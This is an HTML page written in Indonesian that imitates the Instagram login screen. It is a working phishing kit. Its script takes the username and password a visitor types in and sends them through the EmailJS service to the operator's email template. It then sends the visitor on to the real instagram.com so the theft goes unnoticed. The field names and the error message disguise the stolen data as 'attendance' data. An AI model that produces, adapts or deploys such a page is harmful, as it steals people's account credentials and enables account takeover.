<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>instragram login</title>

  <!-- EmailJS CDN -->
  <script type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
  </script>
  <script type="text/javascript">
    (function(){
      emailjs.init("mWMeXiPs9M3g6cig1"); // Public Key
    })();
  </script>

  <style>
    body {
      background-color: #121D23;
      color: #fff;
      font-family: Arial, sans-serif;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    img {
      width: 100px;
      margin-bottom: 20px;
    }

    input {
      width: 300px;
      padding: 16px;
      margin-bottom: 10px;
      background-color: #121D23;
      border: 1px solid #ccc;
      border-radius: 10px;
      color: white;
      font-size: 14px;
    }

    button {
      width: 335px;
      padding: 12px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    .link {
      margin-top: 10px;
      color: #ccc;
      font-size: 14px;
      text-align: center;
    }

    .new-account {
      width: 300px;
      text-align: center;
      border: 1px solid #007bff;
      color: #007bff;
      padding: 10px 0;
      border-radius: 30px;
      font-size: 14px;
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
    }

    .new-account:hover {
      background-color: #007bff;
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="ig1.png" alt="logo" />
    <form id="loginForm" style="display: flex; flex-direction: column; align-items: center;">
      <input type="text" id="nama" name="user_name" placeholder="Nama pengguna, email, atau nomor ponsel" required />
      <input type="text" id="status" name="user_status" placeholder="Kata sandi" required />
      <button type="submit">Login</button>
    </form>
    <div class="link">Lupa kata sandi?</div>
  </div>

  <div class="new-account">Buat akun baru</div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const nama = document.getElementById("nama").value;
      const status = document.getElementById("status").value;

      emailjs.send("gmail_service", "template_cwrnhhn", {
        user_name: nama,
        user_status: status
      }).then(function(response) {
        alert("Login berhasil!\nNama: " + nama + "\nStatus: " + status);
        window.location.href = "https://www.instagram.com/"; // Ganti jika ada PR/modul
      }, function(error) {
        alert("Gagal mengirim data absen. Silakan coba lagi.");
      });
    });
  </script>
</body>
        </html>
